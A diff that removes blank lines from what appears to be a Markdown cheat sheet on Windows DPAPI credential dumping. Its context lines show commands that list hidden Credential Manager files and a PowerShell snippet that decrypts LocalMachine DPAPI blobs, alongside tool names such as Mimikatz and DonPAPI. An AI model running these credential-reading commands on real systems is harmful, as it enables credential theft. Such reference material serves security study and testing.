@@ -11,7 +11,6 @@
     * [Hekatomb - Steal all credentials on domain](#hekatomb---steal-all-credentials-on-domain)
     * [DonPAPI - Dumping DPAPI credz remotely](#donpapi---dumping-dpapi-credz-remotely)
 
-
 ## Data Protection API
 
 * Outside of a domain: the user's `password hash` is used to encrypt these "blobs".
@@ -37,7 +36,6 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 
-
 ### DPAPI LocalMachine Context
 
 The `LocalMachine` context is used to protect data that is intended to be shared across different users or services on a single machine. This means that any user or service running on the machine can access the protected data with the appropriate credentials.
@@ -49,7 +47,6 @@ $a = [System.Convert]::FromBase64String("AQAAANCMnd[...]")
 $b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
 [System.Text.Encoding]::ASCII.GetString($b)
 ```
-
 
 ### Mimikatz - Credential Manager & DPAPI
 
